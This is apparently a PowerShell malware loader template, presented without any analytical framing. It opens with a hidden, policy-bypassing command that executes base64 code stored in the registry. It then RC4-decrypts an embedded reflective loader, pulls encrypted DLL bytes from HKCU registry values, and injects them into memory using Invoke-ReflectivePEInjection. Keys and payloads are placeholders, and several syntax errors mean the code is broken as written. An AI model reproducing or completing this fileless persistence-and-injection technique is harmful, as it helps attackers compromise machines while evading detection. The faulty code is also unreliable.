powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\KeyName').ValueName)));$reg_keyname = 'reg_key_placeholder';

$dllname64 = 'dll64_regValueName_placeholder';
$dllname32 = 'dll32_regValueName_placeholder';

Function rc4cipher
{
	Param([Parameter(Position=0,Mandatory = $true)[Byte[]]$plaindata,[Parameter(Position=1,Mandatory=$true)][Byte[]]$keydata)
	
	[Byte[]] $k = New-Object Byte[] 256;
	[Byte[]] $s = New-Object Byte[] 256;
	
	for($i = 0; $i -lt 256; $i++){
		$s[$i] = [Byte] $i;
		$k[$i] = $keydata[$i % $keydata.Length];
	}
	
	$p = 0;
	
	$for($i=0;$i -lt 256; $i++){
		$p = ($p + $s[$i] + $k[$i]) % 256;
		$s[$i],$s[$p] = $s[$p],$s[$i];
	}
	
	$i = 0; $p = 0;
	
	for ($c = 0; $c -lt $plaindata.Length; $c++){
		$i = ($i + 1) % 256;
		$p = ($p + $s[$i]) % 256;
		$s[$i],$s[$p] = $s[$p],$s[$i];
		[int]$m = ($s[$i] + $s[$p]) % 256;
		$plaindata[$c] = $plaindata[$c] -bxor $s[$m];
	}
	return $plaindata;
}
Function inflatebin
{
	Param([Parameter(Position=0,Mandatory=$true)]$plaindata)
	
	$memstream = New-Object System.IO.MemoryStream;
	$memstream.Write($plaindata,0,$plaindata.Length);
	$memstream.Seek(0,0) | Out-Null;
	$gzstream = New-Object System.IO.Compression.GZipStream($memstream,[IO.Compression.CompressionMode]::Decompress);
	$reader = New-object System.IO.StreamReader($gzstream);
	$plaindata = $reader.ReadToEnd();
	$reader.close()
	return $plaindata
}

$rc4key = [System.Text.Encoding]::ASCII.GetBytes('cipherkey');
$pscript = [System.Convert]:FromBase64String('base64_encoded_reflective_loader_ps1');
$pscript = rc4cipher -plaindata $pscript -keydata $rc4key
$pscript = inflatebin -plaindata $pscript
$szreqpath = 'HKCU:\Software\Classes\' + $reg_keyname;
$dllbytes = '';

if ([IntPtr]::Size -eq 8) { # determinar si la máquina es 64 bits
	$dllbytes = (Get-ItemProperty -Path $szreqpath -Name $dllname64).$dllname64;
}else{ # si no la tomará como 32 bits 
	$dllbytes = (Get-ItemProperty -Path $szreqpath -Name $dllname32).$dllname32;
}

$dllbytes = rc4cipher -plaindata $dllbytes -keydata $rc4key
#$dllbytes = inflatebin2 -plaindata $dllbytes

$pscript = $pscript + 'Invoke-ReflectivePEInjection -PEBytes $dllbytes;'
iex $pscript;